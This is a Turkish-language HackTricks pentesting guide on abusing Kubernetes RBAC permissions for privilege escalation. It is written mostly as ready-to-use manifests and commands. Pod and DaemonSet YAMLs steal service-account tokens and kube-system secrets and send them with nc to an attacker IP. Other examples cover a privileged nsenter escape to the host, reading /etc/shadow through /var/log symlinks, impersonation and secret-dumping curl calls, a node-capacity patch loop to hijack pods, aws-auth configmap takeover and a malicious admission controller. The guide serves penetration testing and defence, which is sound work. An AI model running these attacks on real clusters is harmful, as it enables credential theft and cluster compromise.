# Kubernetes'te Rollerin/Küme Rollerinin Kötüye Kullanımı

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

Potansiyel olarak tehlikeli Roller ve Küme Rollerleri yapılandırmalarını burada bulabilirsiniz.\
Tüm desteklenen kaynakları `kubectl api-resources` ile alabileceğinizi unutmayın

## **Ayrıcalık Yükseltme**

Küme içinde **farklı ayrıcalıklara sahip başka bir prensibe erişim** olarak atıfta bulunulan **ayrıcalıkları yükseltme sanatı** (kubernetes kümesi içinde veya dış bulutlara) elde etme, Kubernetes'te temelde **4 ana teknik ayrıcalıkları yükseltmek için** bulunmaktadır:

* Kubernetes kümesi içinde veya dış bulutlara **daha iyi ayrıcalıklara sahip diğer kullanıcı/gruplar/SA'ları taklit edebilmek**
* **Pod'lar oluşturmak/yamalamak/çalıştırmak** ve burada **daha iyi ayrıcalıklara sahip SA'ları bulabilir veya ekleyebilirsiniz**
* SA'ların tokenlarının saklandığı gibi **gizli bilgileri okuyabilmek**
* Bir konteynerden **düğüme kaçabilmek** ve bu sayede düğümde çalışan konteynerlerin tüm gizli bilgilerini, düğümün kimlik bilgilerini ve düğümün bulut içindeki izinlerini (varsa) çalabilmek
* Bir pod'da **port-forward çalıştırma** yeteneği, bu sayede o pod içinde ilginç kaynaklara erişebilme olasılığınız olabilir.

### Herhangi Bir Kaynağa veya Fiile Erişim (Yıldız İfadesi)

**Yıldız ifadesi (\*) herhangi bir kaynağa herhangi bir fiil üzerinde izin verir**. Yöneticiler tarafından kullanılır. Bir ClusterRole içinde bu, saldırganın kümedeki herhangi bir alan adını kötüye kullanabileceği anlamına gelir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Belirli bir fiil ile Herhangi Bir Kaynağa Erişim

RBAC'de, belirli izinler önemli riskler oluşturur:

1. **`create`:** Herhangi bir küme kaynağını oluşturma yetkisi verir, ayrıcalık yükselmesine neden olabilir.
2. **`list`:** Tüm kaynakları listeleme izni verir, hassas verilerin sızmasına neden olabilir.
3. **`get`:** Hizmet hesaplarından gizli bilgilere erişimi sağlar, güvenlik tehdidi oluşturabilir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Oluştur - Token Çalma

Bir saldırgan, bir pod oluşturma izinlerine sahipse, pod'a ayrıcalıklı bir Hizmet Hesabı ekleyebilir ve token'ı çalarak Hizmet Hesabı olarak kimlik hırsızlığı yapabilir. Bu şekilde ayrıcalıkları artırabilir.

Saldırganın `bootstrap-signer` hizmet hesabının token'ını çalacak ve saldırganın adresine gönderecek bir pod örneği:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Oluşturma ve Kaçış

Aşağıdaki, bir konteynerin sahip olabileceği tüm ayrıcalıkları gösterir:

* **Ayrıcalıklı erişim** (korumaları devre dışı bırakma ve yeteneklerin ayarlanması)
* **hostIPC ve hostPid ad alanlarını devre dışı bırakma** ayrıcalıkları yükseltmeye yardımcı olabilir
* **hostNetwork ad alanını devre dışı bırakma**, düğümlerin bulut ayrıcalıklarını çalmak ve ağlara daha iyi erişim sağlamak için erişim sağlar
* **Konteyner içinde ana bilgisayarı bağlama**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Aşağıdaki komutla pod oluşturun:
```bash
kubectl --token $token create -f mount_root.yaml
```
Bir tweet'ten bir satır ve bazı eklemeler:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Şimdi düğüme kaçış tekniklerini kontrol etmek için kaçış tekniklerini kullanabilirsiniz:

#### Gizlilik

Muhtemelen daha **gizli** olmak istersiniz, aşağıdaki sayfalarda, önceki şablonlarda belirtilen ayrıcalıkların yalnızca bazılarını etkinleştirerek yalnızca bir kapsül oluşturursanız erişebileceğiniz şeyleri görebilirsiniz:

* **Ayrıcalıklı + hostPID**
* **Yalnızca ayrıcalıklı**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Önceki ayrıcalıklı kapsül yapılandırmalarını nasıl oluşturabileceğinizi/istismar edebileceğinizi_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _adresinde bulabilirsiniz_

### Kapsül Oluştur - Buluta Taşı

Bir **kapsül** (ve isteğe bağlı olarak bir **hizmet hesabı**) **oluşturabilirseniz**, bir **kapsül veya hizmet hesabına bulut rolleri atayarak** ve ardından erişerek **bulut ortamında ayrıcalıklar elde edebilirsiniz**.\
Dahası, **ana ağ ad alanına sahip bir kapsül oluşturabilirseniz**, **düğüm** örneğinin **IAM** rolünü **çalabilirsiniz**.

Daha fazla bilgi için kontrol edin:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Dağıtım, Daemonset, Statefulset, Replicationcontroller, Replicaset, İşler ve Zamanlanmış İşler Oluştur/Patchle**

Bu izinleri **kullanarak yeni bir kapsül oluşturmak** ve önceki örnekte olduğu gibi ayrıcalıklar **elde etmek mümkündür**.

Aşağıdaki yaml, **bir daemonset oluşturur ve kapsül içindeki SA'nın belirteçini dışa aktarır**:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Podlar Exec**

**`pods/exec`**, bir Kubernetes kaynağıdır ve bir pod içinde bir kabukta komut çalıştırmak için kullanılır. Bu, **konteynerler içinde komut çalıştırmaya veya bir kabuk almayı** mümkün kılar.

Bu nedenle, bir podun içine girip SA'nın belirteci çalınabilir veya ayrıcalıklı bir poda girebilir, düğüme kaçabilir ve düğümdeki tüm podların belgelerini çalabilir ve düğümü (kötüye) kullanabilirsiniz:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Bu izin, belirtilen pod içinde çalışan uygulamaları hata ayıklamak için kolayca erişilebilir kılmak amacıyla **bir yerel bağlantı noktasını belirtilen pod içindeki bir bağlantı noktasına yönlendirmeyi** sağlar, ancak bir saldırgan bu izni kullanarak pod içinde ilginç (örneğin DB'ler) veya savunmasız uygulamalara (web?) erişebilir:
```
kubectl port-forward pod/mypod 5000:5000
```
### Ana Bilgisayar Yazılabilir /var/log/ Kaçışı

[**Bu araştırmada belirtildiği gibi**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), eğer **ana bilgisayarda `/var/log/` dizini bağlanmış** bir pod'a erişebilir veya oluşturabilirseniz, **konteynerden kaçabilirsiniz**.\
Bu temelde, **Kube-API'nin bir konteynerin log'larını almayı denediğinde** ( `kubectl logs <pod>` kullanarak), **Kubelet** servisinin `/logs/` uç noktasını kullanarak pod'un `0.log` dosyasını istediğini belirtir.\
Kubelet servisi, konteynerin `/var/log` dosya sisteminin temelde **açığa çıkarıldığı** `/logs/` uç noktasını sunar.

Bu nedenle, bir saldırganın **konteynerin /var/log/ klasörüne yazma erişimi** olduğunda, bu davranışları 2 şekilde kötüye kullanabilir:

* Genellikle `/var/logs/pods/namespace_pod_uid/container/0.log` konumunda bulunan kendi konteynerinin `0.log` dosyasını **örneğin `/etc/shadow`'a işaret eden bir sembolik bağ yaparak** değiştirme. Ardından, ana bilgisayarın shadow dosyasını dışa aktarabilirsiniz:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Eğer saldırganın, `nodes/log`'u okuma izinlerine sahip herhangi bir anahtar kontrolü varsa, sadece `/host-mounted/var/log/sym` içinde `/`'e bir **sembolik bağ** oluşturabilir ve **`https://<gateway>:10250/logs/sym/` adresine eriştiğinde ana bilgisayarın kök** dosya sistemini listeleyebilir (sembolik bağ değiştirilerek dosyalara erişim sağlanabilir).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Bir laboratuvar ve otomatik saldırı, [https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) adresinde bulunabilir.

#### readOnly korumasını atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Eğer şanslıysanız ve yüksek ayrıcalıklı yetenek `CAP_SYS_ADMIN` mevcutsa, sadece klasörü rw olarak yeniden bağlayabilirsiniz:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath readOnly korumasını atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**bu araştırmada**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) belirtildiği gibi korumayı atlatmak mümkündür:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Bu, öncekiler gibi kaçışları önlemek için bir hostPath bağlama yerine bir PersistentVolume ve bir PersistentVolumeClaim kullanarak bir ana klasörü konteynıra yazılabilir erişimle bağlamayı amaçlıyordu:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Ayrıcalıklı hesapları taklit etme**

Bir [**kullanıcı taklidi**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ayrıcalığı ile, bir saldırgan ayrıcalıklı bir hesabı taklit edebilir.

Bir kullanıcıyı taklit etmek için `kubectl` komutunda `--as=<kullanıcıadı>` parametresini kullanın, veya bir grup taklit etmek için `--as-group=<grup>` kullanın:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ya da REST API'sini kullanın:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Sırları Listeleme

**Sırları listeleme izni, bir saldırganın aslında sırları okumasına izin verebilir** REST API uç noktasına erişerek:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Bir sırrı okuma - belirteç kimliklerini kaba kuvvet saldırısıyla deneme

Okuma izinlerine sahip bir saldırganın sırrı kullanabilmesi için tam adı gerekmektedir, daha geniş _**sırları listeleme**_ ayrıcalığından farklı olarak, hala zayıflıklar bulunmaktadır. Sistemdeki varsayılan hizmet hesapları numaralandırılabilir, her biri bir sırla ilişkilendirilmiştir. Bu sırların bir ad yapısı vardır: statik bir önek ve ardından rastgele beş karakterlik alfasayısal bir belirteç (belirli karakterleri hariç tutarak) [kaynak koduna](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) göre.

Belirteç, tam alfasayısal aralık yerine sınırlı 27 karakterlik bir kümeden (`bcdfghjklmnpqrstvwxz2456789`) oluşturulur. Bu kısıtlama toplam olası kombinasyonu 14,348,907'ye (27^5) düşürür. Sonuç olarak, bir saldırgan muhtemelen birkaç saat içinde belirteci çıkarmak için kaba kuvvet saldırısı gerçekleştirebilir ve hassas hizmet hesaplarına erişerek ayrıcalık yükseltmesine yol açabilir.

### Sertifika İmzalama İstekleri

Eğer `certificatesigningrequests` kaynağında **`create`** fiillerine sahipseniz (veya en azından `certificatesigningrequests/nodeClient` içinde), yeni bir düğümün CeSR'sini **oluşturabilirsiniz**.

[Belgelendirmeye göre bu istekleri otomatik olarak onaylamak mümkündür](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), bu durumda **ekstra izinlere ihtiyacınız yoktur**. Aksi takdirde, isteği onaylayabilmeniz gerekecektir, bu da `certificatesigningrequests/approval` içinde güncelleme yapmanızı ve `signers` içinde `<signerNameDomain>/<signerNamePath>` veya `<signerNameDomain>/*` ile onaylamayı gerektirir.

Tüm gerekli izinlere sahip bir rolün **örneği** şöyle:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Yani, yeni düğüm CSR onaylandıktan sonra, düğümlerin özel izinlerini **kötüye kullanarak** **sırları çalabilir** ve **yetkileri yükseltebilirsiniz**.

[**Bu yazıda**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ve [**bu yazıda**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap yapılandırması **otomatik imzalama** ile yapılandırılmış ve yeni bir K8s Düğümünün kimlik bilgilerini oluşturmak için kötüye kullanılmış ve ardından bu kimlik bilgilerini çalarak yetkileri yükseltmek için kötüye kullanılmıştır. Eğer **söz konusu izinlere sahipseniz aynı şeyi yapabilirsiniz**. İlk örneğin, bir düğümün yalnızca üzerine bağlanmış konteynerlerin sırlarına erişmesini engelleyen hatayı atlamasına dikkat edin çünkü **bir düğüm yalnızca üzerine bağlanmış konteynerlerin sırlarına erişebilir.**

Bunu atlatmanın yolu, sadece **ilginç sırların bulunduğu konteynerin bağlı olduğu düğüm adı için bir düğüm kimlik bilgisi oluşturmaktır** (ancak bunu nasıl yapılacağını yalnızca ilk yazıda kontrol edin):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

AWS (Amazon Web Services) küme yöneticisi ayrıcalıklarını elde etmek için EKS (Elastic Kubernetes Service) küme içinde kube-system ad alanındaki **`configmaps`**'ı değiştirebilen temel kullanıcılar, **aws-auth** configmap'ini üzerine yazarak bu ayrıcalıkları elde edebilirler.\
Gerekli fiiller **`update`** ve **`patch`**'dir, ya da configmap oluşturulmadıysa **`create`** kullanılabilir:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**Başka hesaplardan kullanıcılara erişim sağlamak için** **`aws-auth`** kullanabilirsiniz.

Ancak `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **farklı bir hesaptan çalışmaz**. Ancak aslında `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` çalışır, eğer sadece isim yerine kümenin ARN'sini koyarsanız.\
`kubectl`'yi çalıştırmak için, sadece **kurbanın kubeconfig'ini yapılandırdığınızdan** ve aws exec argümanlarına `--profile other_account_role` eklediğinizden emin olun, böylece kubectl diğer hesap profili kullanarak belirteci alacak ve AWS ile iletişim kuracaktır.
{% endhint %}

### GKE'de Yükselme

**GCP prensiplerine K8s izinleri atamanın 2 yolu** vardır. Her durumda prensip ayrıca küme erişimine erişim sağlamak için **`container.clusters.get`** iznine ihtiyaç duyar, ya da **kendi kubectl yapılandırma dosyanızı oluşturmanız** gerekecektir (aşağıdaki bağlantıyı takip edin).

{% hint style="warning" %}
K8s api uç noktasıyla iletişim kurulurken, **GCP kimlik doğrulama belirteci gönderilecektir**. Ardından, GCP, K8s api uç noktası aracılığıyla önce prensibin (e-posta ile) küme içinde herhangi bir erişime sahip olup olmadığını kontrol edecek, ardından GCP IAM aracılığıyla herhangi bir erişime sahip olup olmadığını kontrol edecektir.\
Eğer bunlardan **herhangi biri doğruysa**, yanıt verilecektir. Eğer **değilse**, GCP IAM aracılığıyla izin verilmesi gerektiğini belirten bir hata verilecektir.
{% endhint %}

Ardından, ilk yöntem **GCP IAM** kullanmaktır, K8s izinleri **eşdeğer GCP IAM izinlerine** sahiptir ve eğer prensip bunlara sahipse, bunları kullanabilir.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

İkinci yöntem, **kullanıcıyı kimliğine göre** (GCP hizmet hesapları dahil) **küme içinde K8s izinleri atamaktır**.

### serviceaccounts belirteci oluşturma

**TokenRequests** (`serviceaccounts/token` oluşturabilen prensipler) K8s api uç noktasıyla iletişim kurulduğunda SAs (bilgi [**burada**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

**`pods/ephemeralcontainers`**'ı **`güncelleme`** veya **`yama`** yapabilen prensipler, başka podlarda **kod yürütme yetkisi** kazanabilir ve bir ayrıcalıklı securityContext ile geçici bir konteyner ekleyerek kendi düğümüne **kaçabilir**.

### ValidatingWebhookConfigurations veya MutatingWebhookConfigurations

`validatingwebhookconfigurations` veya `mutatingwebhookconfigurations` üzerinde `oluşturma`, `güncelleme` veya `yama` fiillerine sahip prensipler, ayrıcalıkları **yükseltmek** için bir webhook yapılandırmasından birini **oluşturabilir**.

[`mutatingwebhookconfigurations` örneği için bu bölüme bakın](./#malicious-admission-controller).

### Yükseltme

Şu bölümde okuyabileceğiniz gibi: [**Dahili Ayrıcalıklı Yükseltme Önleme**](./#built-in-privileged-escalation-prevention), bir prensip, kendisinde olmayan yeni izinlere sahip olmadan rolleri veya clusterrolleri güncelleyemez veya oluşturamaz. Ancak **`roller`** veya **`clusterroller`** üzerinde **`yükselt`** fiiline sahipse, yeni rolleri, clusterrolleri kendisindeki izinlerden daha iyi izinlerle oluşturabilir veya güncelleştirebilir.

### Düğümler proxy

**`nodes/proxy`** alt kaynağına erişimi olan prensipler, Kubelet API'si aracılığıyla podlarda **kod yürütebilir** (bakınız [**burası**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Bu sayfada Kubelet kimlik doğrulaması hakkında daha fazla bilgi bulabilirsiniz:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Yetkili bir şekilde Kubelet API'sine konuşarak [**RCE almak için bir örnek burada**](../pentesting-kubernetes-services/#kubelet-rce). 

### Podları silme + planlanamayan düğümler

Podları **silebilen** (`pods` kaynağı üzerinde `silme` fiili), podları **boşaltabilen** (`pods/eviction` kaynağı üzerinde `oluşturma` fiili) veya **pod durumunu değiştirebilen** ( `pods/status` erişimi) ve **diğer düğümleri planlanamaz hale getirebilen** ( `nodes/status` erişimi) veya **düğümleri silebilen** (`nodes` kaynağı üzerinde `silme` fiili) ve bir pod üzerinde kontrolü olan prensipler, podları **başka düğümlerden çalabilir** böylece bunlar **kompromize edilmiş düğümde** çalıştırılır ve saldırgan bu podlardan **belirteçleri çalabilir**.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Hizmet durumu (CVE-2020-8554)

**`services/status`**'ı **değiştirebilen** yetkililer, `status.loadBalancer.ingress.ip` alanını ayarlayarak **düzeltilmemiş CVE-2020-8554**'ü istismar edebilir ve **clus**ter'a karşı **MiTM saldırıları başlatabilir**. CVE-2020-8554 için çoğu önlem, yalnızca ExternalIP hizmetlerini engeller ([**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego) bağlantıya göre).

### Düğümler ve Pod'ların durumu

`nodes/status` veya `pods/status` üzerinde **`güncelleme`** veya **`yama`** izinlerine sahip olan yetkililer, zamanlama kısıtlamalarını etkilemek için etiketleri değiştirebilir.

## Yerleşik Ayrıcalık Yükseltme Önleme

Kubernetes'in [yerleşik bir mekanizması](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ayrıcalık yükseltmeyi önler.

Bu sistem, **kullanıcıların rolleri veya rol bağlantılarını değiştirerek ayrıcalıklarını yükseltememesini sağlar**. Bu kuralın uygulanması API seviyesinde gerçekleşir ve RBAC yetkilendiricisi etkisiz olsa bile bir koruma sağlar.

Kural, bir **kullanıcının yalnızca bir rol oluşturabileceğini veya güncelleme yapabileceğini belirtirken, rolün içerdiği tüm izinlere sahip olması gerektiğini** belirtir. Dahası, kullanıcının mevcut izinlerinin kapsamı, oluşturmayı veya değiştirmeyi denediği rolün kapsamıyla uyumlu olmalıdır: ya ClusterRoles için küme genelinde ya da Roller için aynı ad alanına (veya küme genelinde) sınırlı olmalıdır.

{% hint style="warning" %}
Önceki kurala bir istisna vardır. Eğer bir yetkili **`yükselt`** fiiline sahipse **`roller`** veya **`clusterroller`** üzerinde, rollerin ve clusterrollerin ayrıcalıklarını artırabilir, hatta kendisinde izin olmasa bile.
{% endhint %}

### **RolBağlantıları/ClusterRoleBağlantıları Al & Yama**

{% hint style="danger" %}
**Görünüşe göre bu teknik önceden işe yarıyordu, ancak testlerime göre artık önceki bölümde açıklanan aynı nedenle çalışmıyor. Kendinize veya farklı bir SA'ya bazı ayrıcalıklar vermek için bir rol bağlantısı oluşturamazsınız/değiştiremezsiniz, eğer zaten izniniz yoksa.**
{% endhint %}

RolBağlantıları oluşturma ayrıcalığı, bir kullanıcının **rolleri bir hizmet hesabına bağlamasına** olanak tanır. Bu ayrıcalık, **kullanıcının bir tehlikeli hizmet hesabına yönetici ayrıcalıklarını bağlamasına izin verdiği için ayrıcalık yükseltmeye yol açabilir.**

## Diğer Saldırılar

### Yan araç proxy uygulaması

Varsayılan olarak, pod'lar arasındaki iletişimde şifreleme yoktur. Karşılıklı kimlik doğrulama, iki yönlü, poddan poda.

#### Yan araç proxy uygulaması oluşturma <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml dosyanızı oluşturun
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Yaml dosyanızı düzenleyin ve yorum satırlarını ekleyin:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Proxy'nin günlüklerini görüntüleyin:
```bash
kubectl logs app -C proxy
```
Daha fazla bilgi için: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Kötü Niyetli Kabul Denetleyicisi

Bir kabul denetleyicisi, nesnenin kalıcılığına geçmeden önce Kubernetes API sunucusuna yapılan istekleri **onaylanmış ve yetkilendirilmiş** olduktan sonra **engeller**.

Bir saldırgan, bir Mutasyon Kabul Denetleyicisi **enjekte etmeyi başarırsa**, zaten doğrulanmış istekleri **değiştirebilir**. Bu, potansiyel olarak ayrıcalık yükseltme ve daha yaygın olarak kümede kalıcılık sağlama yeteneği sunar.

**Örnek** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Durumunu kontrol etmek için hazır mı:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Sonra yeni bir pod dağıt:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Eğer `ErrImagePull` hatasını görüyorsanız, görüntü adını aşağıdaki sorgulardan biriyle kontrol edin:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
